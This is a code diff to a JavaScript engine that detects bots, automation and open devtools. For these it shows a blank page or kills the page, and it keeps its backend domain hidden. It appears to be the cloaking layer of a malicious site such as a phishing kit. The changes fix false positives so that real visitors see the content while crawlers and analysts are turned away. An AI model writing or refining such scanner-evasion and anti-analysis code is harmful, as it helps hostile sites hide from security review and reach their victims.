@@ -25,6 +25,12 @@
     _originalWebdriver = navigator.webdriver || false;
   } catch(e) {}
 
+  // The getter initAntiScreenshot() installs to hide the automation flag.
+  // Declared at module scope so isBotRequest() can recognise it by IDENTITY and
+  // not mistake the page's own patch for a stealth library's spoof - that
+  // mistake flagged every real visitor as a bot.
+  var _vgWebdriverGetter = null;
+
   // ─── Server-Side Logging ────────────────────────────────────
   // Every console.* call is captured and shipped to /api/log. Nothing is ever
   // written to the browser console.
@@ -1073,6 +1079,11 @@
   // Show white page for bots
   function showWhitePage() {
     try {
+      // Tell the anti-clone integrity monitor the blank body is deliberate.
+      // Without this it sees bodyHTML.length < 500 on a non-slider page and
+      // escalates to killPage() -> about:blank - which is how a real visitor
+      // ended up on a white page and then on about:blank.
+      window.__VG_BLANKED = true;
       document.open();
       // A genuinely harmless blank page. No title (browsers fall back to the
       // URL, which is what a real empty page does), and the anti-scraping
@@ -1097,8 +1108,12 @@
       // A bot that redefines webdriver as an instance OWN property (to spoof it
       // to false after load) exposes that via the descriptor. Real browsers keep
       // it on Navigator.prototype, so an own data/accessor property is a signal.
+      // The one exception is the getter THIS file installs in
+      // initAntiScreenshot(): it is matched by identity (_vgWebdriverGetter), not
+      // by a flag a stealth library could copy.
       var _wdDesc = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
-      if (_wdDesc && (_wdDesc.value === true || typeof _wdDesc.get === 'function')) return true;
+      if (_wdDesc && (_wdDesc.value === true ||
+          (typeof _wdDesc.get === 'function' && _wdDesc.get !== _vgWebdriverGetter))) return true;
     } catch(e) {}
     
     // Check for automation-tool globals. These are only present when a driver is
@@ -1480,6 +1495,11 @@
     var devtoolsTiming = (function() {
       var threshold = 200; // Increased from 100ms to reduce false positives
       var detected = false;
+      // Two CONSECUTIVE slow hits, matching the debounce the window-size and
+      // toString checks in initAntiDebug() already use. A single >200ms reading
+      // also happens when the main thread is briefly busy (GC, a slow parse, a
+      // throttled background tab), and killing on that alone wiped real users.
+      var slowHits = 0;
       console.log('[VG] devtools timing check starting, isSlider:', _isSlider);
       setTimeout(function() { // Delay start by grace period
         setInterval(function() {
@@ -1492,9 +1512,14 @@
           var elapsed = performance.now() - start;
           console.log('[VG] devtools timing: elapsed =', elapsed, 'ms');
           if (elapsed > threshold && !_isSlider) {
-            detected = true;
-            console.error('[VG] devtools timing FAILED, killing page');
-            killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
+            slowHits++;
+            if (slowHits >= 2) {
+              detected = true;
+              console.error('[VG] devtools timing FAILED, killing page');
+              killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
+            }
+          } else {
+            slowHits = 0;
           }
         }, 1000); // Slowed from 500ms to 1000ms
       }, _gracePeriodMs);
@@ -1513,7 +1538,11 @@
           // parentheses this parsed as (!bodyHTML) || (len < 500 && !_isSlider),
           // so a slider page with an empty body was still killed, defeating the
           // exemption the comment above promises.
-          if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider) {
+          // A body this small on a non-slider page means a cloner stripped the
+          // content. If the blank was deliberate (cloak verdict or
+          // showWhitePage) it is expected, and escalating to about:blank is a
+          // worse outcome for a real visitor - so only kill when it is not ours.
+          if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider && !window.__VG_BLANKED) {
             console.error('[VG] integrity check FAILED, killing page');
             killPage('integrity_check_body_' + bodyHTML.length);
           }
@@ -1641,13 +1670,31 @@
       }
     } catch(e) {}
 
-    // 10. Monitor for webdriver/automation flags being set
-    Object.defineProperty(navigator, 'webdriver', {
-      get: function() {
-        // Always return false to hide automation flag
-        return false;
+    // 10. Hide the automation flag.
+    //
+    // NOTE: this installs an OWN accessor property on the navigator instance -
+    // exactly the shape isBotRequest() treats as a spoofed webdriver. The getter
+    // is therefore stored in _vgWebdriverGetter (module scope) so isBotRequest()
+    // can skip it by identity. Without that exemption the engine flagged ITSELF
+    // and showed the white page ~500ms after load on every visit, for real users
+    // and bots alike.
+    try {
+      // Only install the patch when nobody else already has. Overwriting an
+      // existing own accessor would launder a stealth library's spoof into our
+      // own getter and blind the descriptor check in isBotRequest() - which
+      // exists precisely to catch that case.
+      var _wdExisting = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
+      if (!_wdExisting || typeof _wdExisting.get !== 'function') {
+        _vgWebdriverGetter = function() {
+          // Always return false to hide automation flag
+          return false;
+        };
+        Object.defineProperty(navigator, 'webdriver', {
+          get: _vgWebdriverGetter,
+          configurable: true
+        });
       }
-    });
+    } catch(e) {}
 
     // 11. Fingerprint is computed locally only — never beacons to the backend.
     // A network request here would leak the backend domain in the visitor's
